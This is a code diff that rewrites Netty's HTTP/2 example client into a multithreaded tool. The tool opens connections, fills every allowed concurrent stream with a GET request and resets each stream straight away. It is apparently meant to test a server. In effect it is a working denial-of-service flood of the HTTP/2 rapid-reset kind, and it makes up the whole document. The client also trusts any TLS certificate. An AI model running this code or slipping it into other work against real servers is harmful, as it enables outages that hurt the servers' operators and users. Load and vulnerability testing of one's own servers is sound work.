@@ -17,6 +17,7 @@ package io.netty.example.http2.helloworld.client;
 import io.netty.bootstrap.Bootstrap;
 import io.netty.buffer.Unpooled;
 import io.netty.channel.Channel;
+import io.netty.channel.ChannelHandlerContext;
 import io.netty.channel.ChannelOption;
 import io.netty.channel.EventLoopGroup;
 import io.netty.channel.nio.NioEventLoopGroup;
@@ -42,6 +43,9 @@ import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
 import io.netty.util.AsciiString;
 import io.netty.util.CharsetUtil;
 
+import java.util.concurrent.Callable;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ExecutorService;
 import java.util.concurrent.TimeUnit;
 
 import static io.netty.buffer.Unpooled.wrappedBuffer;
@@ -69,13 +73,64 @@ public final class Http2Client {
 
     public static void main(String[] args) throws Exception {
         // Configure SSL.
-        final SslContext sslCtx;
+        final SslContext sslCtx = initializeSSL();
+        // Create Netty objects for connections
+        EventLoopGroup workerGroup = new NioEventLoopGroup();
+        Http2ClientInitializer initializer = new Http2ClientInitializer(sslCtx, Integer.MAX_VALUE);
+        HttpResponseHandler responseHandler = initializer.responseHandler();
+        // Create request specific config
+        HttpScheme scheme = SSL ? HttpScheme.HTTPS : HttpScheme.HTTP;
+        AsciiString hostName = new AsciiString(HOST + ':' + PORT);
+        FullHttpRequest request = createSimpleGetRequest(URL, hostName, scheme);
+        // Create and executor service for managing threads
+        final ExecutorService executor = Executors.newFixedThreadPool(100);
+        // Start test for bombarding streams and cancelling them
+        System.err.println("Starting bombarding requests...");
+        try {
+            for (int i = 0; i < 10; i++) {
+                // Open connection to server
+                Channel channel = openConnection(workerGroup, initializer);
+                System.out.println("Connected to [" + HOST + ':' + PORT + ']');
+
+                // Wait for the HTTP/2 upgrade to occur.
+                Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();
+                try {
+                    http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);
+                } catch (Exception e) {
+                    System.out.println("Catched exception/timeout waiting for preface " +
+                        "from [" + HOST + ':' + PORT + ']');
+                    continue;
+                }
+
+                // Start all the streams possibly allowed and cancel them
+                long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
+                System.out.println("Going until streams: " + maxConcurrentStreams);
+                // Think about running this in a thread concurrently with other threads
+                // To have concurrent streams running at the same time
+                for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
+                    executor.submit(new RequestAndResetCallable(request, http2SettingsHandler.ctx,
+                        initializer, channel, streamId));
+                }
+
+                System.out.println("Finished HTTP/2 request");
+
+                // Wait until the connection is closed. Possibly start another connection
+                channel.close();
+            }
+        } finally {
+            workerGroup.shutdownGracefully();
+            executor.shutdownNow();
+        }
+    }
+
+    public static SslContext initializeSSL() throws Exception {
+        SslContext sslCtx;
         if (SSL) {
             SslProvider provider = OpenSsl.isAlpnSupported() ? SslProvider.OPENSSL : SslProvider.JDK;
             sslCtx = SslContextBuilder.forClient()
                 .sslProvider(provider)
                 /* NOTE: the cipher filter may not include all ciphers required by the HTTP/2 specification.
-                 * Please refer to the HTTP/2 specification for cipher requirements. */
+                * Please refer to the HTTP/2 specification for cipher requirements. */
                 .ciphers(Http2SecurityUtil.CIPHERS, SupportedCipherSuiteFilter.INSTANCE)
                 .trustManager(InsecureTrustManagerFactory.INSTANCE)
                 .applicationProtocolConfig(new ApplicationProtocolConfig(
@@ -90,60 +145,69 @@ public final class Http2Client {
         } else {
             sslCtx = null;
         }
-
-        EventLoopGroup workerGroup = new NioEventLoopGroup();
-        Http2ClientInitializer initializer = new Http2ClientInitializer(sslCtx, Integer.MAX_VALUE);
-
-        try {
-            // Configure the client.
-            Bootstrap b = new Bootstrap();
-            b.group(workerGroup);
-            b.channel(NioSocketChannel.class);
-            b.option(ChannelOption.SO_KEEPALIVE, true);
-            b.remoteAddress(HOST, PORT);
-            b.handler(initializer);
-
-            // Start the client.
-            Channel channel = b.connect().syncUninterruptibly().channel();
-            System.out.println("Connected to [" + HOST + ':' + PORT + ']');
-
-            // Wait for the HTTP/2 upgrade to occur.
-            Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();
-            http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);
-
-            HttpResponseHandler responseHandler = initializer.responseHandler();
-            int streamId = 3;
-            HttpScheme scheme = SSL ? HttpScheme.HTTPS : HttpScheme.HTTP;
-            AsciiString hostName = new AsciiString(HOST + ':' + PORT);
-            System.err.println("Sending request(s)...");
-            if (URL != null) {
-                // Create a simple GET request.
-                FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, URL, Unpooled.EMPTY_BUFFER);
-                request.headers().add(HttpHeaderNames.HOST, hostName);
-                request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());
-                request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);
-                request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);
-                responseHandler.put(streamId, channel.write(request), channel.newPromise());
-                streamId += 2;
-            }
-            if (URL2 != null) {
-                // Create a simple POST request with a body.
-                FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, POST, URL2,
-                        wrappedBuffer(URL2DATA.getBytes(CharsetUtil.UTF_8)));
-                request.headers().add(HttpHeaderNames.HOST, hostName);
-                request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());
-                request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);
-                request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);
-                responseHandler.put(streamId, channel.write(request), channel.newPromise());
-            }
-            channel.flush();
-            responseHandler.awaitResponses(5, TimeUnit.SECONDS);
-            System.out.println("Finished HTTP/2 request(s)");
-
-            // Wait until the connection is closed.
-            channel.close().syncUninterruptibly();
-        } finally {
-            workerGroup.shutdownGracefully();
-        }
+        return sslCtx;
     }
+
+    public static Channel openConnection(EventLoopGroup workerGroup, Http2ClientInitializer initializer) {
+        // Configure the client.
+        Bootstrap b = new Bootstrap();
+        b.group(workerGroup);
+        b.channel(NioSocketChannel.class);
+        b.option(ChannelOption.SO_KEEPALIVE, true);
+        b.remoteAddress(HOST, PORT);
+        b.handler(initializer);
+
+        // Start the client.
+        return b.connect().syncUninterruptibly().channel();
+    }
+
+    public static FullHttpRequest createSimpleGetRequest(String url, AsciiString hostName, HttpScheme scheme) {
+        FullHttpRequest request = new DefaultFullHttpRequest(HTTP_1_1, GET, url, Unpooled.EMPTY_BUFFER);
+        request.headers().add(HttpHeaderNames.HOST, hostName);
+        request.headers().add(HttpConversionUtil.ExtensionHeaderNames.SCHEME.text(), scheme.name());
+        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);
+        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);
+        return request;
+    }
+
+    // Think about running this in a thread concurrently with other threads for stream IDs all the way
+    // up to max concurrent streams
+    public static void sendDummyRequestAndReset(FullHttpRequest request, ChannelHandlerContext ctx,
+            Http2ClientInitializer initializer, Channel channel, int streamId) {
+        HttpResponseHandler responseHandler = initializer.responseHandler();
+        responseHandler.put(streamId, channel.write(request), channel.newPromise());
+        channel.flush();
+        initializer.connectionHandler().resetStream(ctx, streamId, 0, channel.newPromise());
+    }
+
+
+    private static class RequestAndResetCallable implements Callable<Void> {
+
+        FullHttpRequest request;
+        ChannelHandlerContext ctx;
+        Http2ClientInitializer initializer;
+        Channel channel;
+        int streamId;
+
+        public RequestAndResetCallable(FullHttpRequest request, ChannelHandlerContext ctx,
+                Http2ClientInitializer initializer, Channel channel, int streamId){
+            super();
+            this.request = request;
+            this.ctx = ctx;
+            this.initializer = initializer;
+            this.channel = channel;
+            this. streamId = streamId;
+        }
+
+        @Override
+        public Void call() throws Exception {
+            HttpResponseHandler responseHandler = initializer.responseHandler();
+            responseHandler.put(streamId, channel.write(request), channel.newPromise());
+            channel.flush();
+            initializer.connectionHandler().resetStream(ctx, streamId, 0, channel.newPromise());
+            return null;
+        }
+
+    }
+
 }
